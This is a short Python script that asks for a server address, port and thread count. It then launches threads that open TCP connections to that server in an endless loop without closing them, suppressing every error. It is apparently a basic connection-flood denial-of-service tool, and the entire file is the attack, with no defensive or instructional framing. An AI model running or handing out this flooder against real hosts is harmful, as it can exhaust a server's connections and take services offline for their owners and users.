import socket
import threading

server_ip = input("Enter server IP: ")
server_port = int(input("Enter server port: "))
num_threads = int(input("Enter number of threads: "))

# Resolve domain name to numeric IP address
try:
    server_ip = socket.gethostbyname(server_ip)
except:
    pass

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
        except:
            pass

for i in range(num_threads):
    t = threading.Thread(target=connect_to_server)
    t.start()
